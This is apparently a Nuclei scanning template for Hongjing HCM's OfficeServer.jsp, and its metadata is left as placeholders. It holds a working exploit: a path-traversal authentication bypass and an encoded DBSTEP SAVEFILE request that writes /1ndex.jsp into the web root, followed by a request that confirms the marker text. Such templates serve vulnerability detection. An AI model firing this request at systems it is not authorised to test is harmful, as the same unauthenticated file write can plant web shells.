id: hongjing_HCM_OfficeServer_upload
info:
  name: Template Name
  author: mhb17
  severity: critical
  description: description
  reference:
    - https://
  tags: tags
requests:
  - raw:
      - |-
        POST /w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
        Content-Length: 429
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
        Connection: close
        Content-Type: 
        Accept-Encoding: gzip, deflate

        DBSTEP V3.0     351             0               666             DBSTEP=REJTVEVQ
        OPTION=U0FWRUZJTEU=
        currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
        FILETYPE=Li5cMW5kZXguanNw
        RECOR1DID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
        originalFileId=wV66
        originalCreateDate=wUghPB3szB3Xwg66
        FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
        needReadFile=yRWZdAS6
        originalCreateDate=wLSGP4oEzLKAz4=iz=66

        helloword
      - |+
        GET /1ndex.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

    req-condition: true
    matchers:
      - type: dsl
        condition: and
        dsl:
          - 'contains((body_2), "helloword") && status_code_2 == 200' 